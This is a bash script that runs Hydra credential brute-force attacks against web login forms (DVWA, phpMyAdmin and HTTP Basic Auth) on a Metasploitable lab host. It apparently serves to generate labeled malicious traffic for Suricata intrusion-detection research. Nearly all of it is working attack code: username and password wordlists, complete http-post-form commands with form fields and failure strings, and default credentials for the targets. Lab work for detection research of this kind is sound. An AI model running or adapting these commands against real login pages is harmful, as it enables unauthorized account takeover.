#!/bin/bash
# ============================================================
# hydra_http_brute.sh
# Attack Type: HTTP web form credential brute force
# Tool: Hydra
# Source: Kali Linux (192.168.20.20)
# Target: Metasploitable web apps (192.168.30.20)
#
# What this does:
#   Submits automated login attempts to web application login
#   forms. Each attempt is a complete HTTP POST request —
#   indistinguishable from a human typing a password except
#   for the volume and timing.
#
# How it differs from hydra_ssh_brute.sh:
#   SSH brute force:  Raw protocol authentication (TCP port 22)
#                     Failure visible at protocol level
#                     Each attempt = new TCP connection
#
#   HTTP brute force: Application-level authentication (HTTP POST)
#                     Failure hidden in response body (200 OK)
#                     Traffic looks like normal web browsing
#                     Must parse response to detect success/fail
#
# Targets on Metasploitable:
#   1. DVWA (Damn Vulnerable Web App) — /dvwa/login.php
#   2. phpMyAdmin                     — /phpmyadmin/
#   3. Mutillidae                     — /mutillidae/index.php
#
# What Suricata will see:
#   ET SCAN Hydra HTTP brute force signatures
#   High rate of POST requests to same URI
#   Repetitive HTTP flows with identical request structure
#   Possible ET WEB_APP DVWA specific rules
#
# Usage:
#   bash hydra-http-brute.sh
#
# After running, log this session in data/session_log.csv:
#   timestamp_start, timestamp_end, hydra_http_brute,
#   192.168.30.20, malicious, X attempts, found/not found
# ============================================================

# ── Configuration ────────────────────────────────────────────
TARGET_IP="192.168.30.20"
OUTPUT_DIR="/tmp/http_brute_results"
mkdir -p "$OUTPUT_DIR"
TIMESTAMP=$(date '+%Y-%m-%d_%H-%M-%S')

# ── Wordlists ─────────────────────────────────────────────────
# Common web app usernames
cat > /tmp/http_users.txt << EOF
admin
administrator
root
user
guest
test
dvwa
mysql
pma
EOF

# Common web app passwords
# DVWA default is admin:password
cat > /tmp/http_passwords.txt << EOF
password
admin
123456
password123
admin123
root
toor
test
guest
letmein
welcome
12345
qwerty
abc123
EOF

echo "============================================"
echo " Hydra HTTP Form Brute Force"
echo " Started:  $(date '+%Y-%m-%d %H:%M:%S')"
echo " Target:   ${TARGET_IP}"
echo "============================================"
echo ""
echo "[!] Record this start time in session_log.csv"
echo ""

# ── Attack 1: DVWA Login ──────────────────────────────────────
echo "[*] Attack 1: DVWA login form (/dvwa/login.php)..."
echo ""

# Hydra HTTP POST flags explained:
#
# -L / -P
#   → Username and password files (same as SSH version)
#
# -t 4
#   → 4 parallel threads
#
# -f
#   → Stop after first success
#
# -V
#   → Verbose output — show each attempt
#
# http-post-form
#   → This is the key difference from SSH brute force
#   → Tells Hydra to send HTTP POST requests to a form
#   → Requires three pieces of information separated by :
#
#   Format: "/path/to/form:POST_body_params:failure_string"
#
#   Part 1: "/dvwa/login.php"
#     → The URL path of the login form
#
#   Part 2: "username=^USER^&password=^PASS^&Login=Login"
#     → The POST body that the form submits
#     → ^USER^ and ^PASS^ are Hydra's placeholders
#     → Hydra replaces them with each username/password combination
#     → You get this by inspecting the form's HTML source
#       (look for <input name="..."> fields)
#
#   Part 3: "Login failed"
#     → The string that appears in the response when login FAILS
#     → Hydra reads the response body and looks for this string
#     → If found → attempt failed, try next combination
#     → If NOT found → login succeeded, report credentials
#     → This is how HTTP brute force differs from SSH —
#       SSH failure is at protocol level, HTTP failure is in HTML

hydra \
    -L /tmp/http_users.txt \
    -P /tmp/http_passwords.txt \
    -t 4 \
    -f \
    -V \
    -o "${OUTPUT_DIR}/dvwa_${TIMESTAMP}.txt" \
    "${TARGET_IP}" \
    http-post-form \
    "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
    2>&1

echo ""
echo "[*] DVWA attack complete"
sleep 3

# ── Attack 2: phpMyAdmin ──────────────────────────────────────
echo "[*] Attack 2: phpMyAdmin (/phpmyadmin/)..."
echo ""

# phpMyAdmin uses a different form structure
# The failure string is "Access denied" for wrong credentials
hydra \
    -L /tmp/http_users.txt \
    -P /tmp/http_passwords.txt \
    -t 4 \
    -f \
    -V \
    -o "${OUTPUT_DIR}/phpmyadmin_${TIMESTAMP}.txt" \
    "${TARGET_IP}" \
    http-post-form \
    "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1&target=index.php:Access denied" \
    2>&1

echo ""
echo "[*] phpMyAdmin attack complete"
sleep 3

# ── Attack 3: HTTP Basic Auth (if any services use it) ───────
echo "[*] Attack 3: HTTP Basic Auth scan..."
echo ""

# Some services use HTTP Basic Authentication instead of forms
# This uses a different Hydra module — http-get
# The traffic looks different: credentials in Authorization header
# instead of POST body

hydra \
    -L /tmp/http_users.txt \
    -P /tmp/http_passwords.txt \
    -t 4 \
    -f \
    -V \
    -o "${OUTPUT_DIR}/basic_auth_${TIMESTAMP}.txt" \
    "${TARGET_IP}" \
    http-get \
    "/" \
    2>&1

echo ""
echo "[*] Basic auth scan complete"

# ── Cleanup ──────────────────────────────────────────────────
rm -f /tmp/http_users.txt /tmp/http_passwords.txt

# ── Summary ──────────────────────────────────────────────────
echo ""
echo "============================================"
echo " HTTP brute force complete: $(date '+%Y-%m-%d %H:%M:%S')"
echo " Results saved to: ${OUTPUT_DIR}/"
echo "============================================"
echo ""

# Check results
for result_file in "${OUTPUT_DIR}"/*_${TIMESTAMP}.txt; do
    if grep -q "login:" "$result_file" 2>/dev/null; then
        echo "[+] Credentials found in $(basename $result_file):"
        grep "login:" "$result_file"
    fi
done

echo ""
echo "[!] Record this end time in session_log.csv"
echo "[!] Label: malicious"
echo "[!] Scenario: hydra_http_brute"
echo ""
echo "Note: DVWA default credentials are admin:password"
echo "Note: phpMyAdmin default on Metasploitable is root:(empty)"
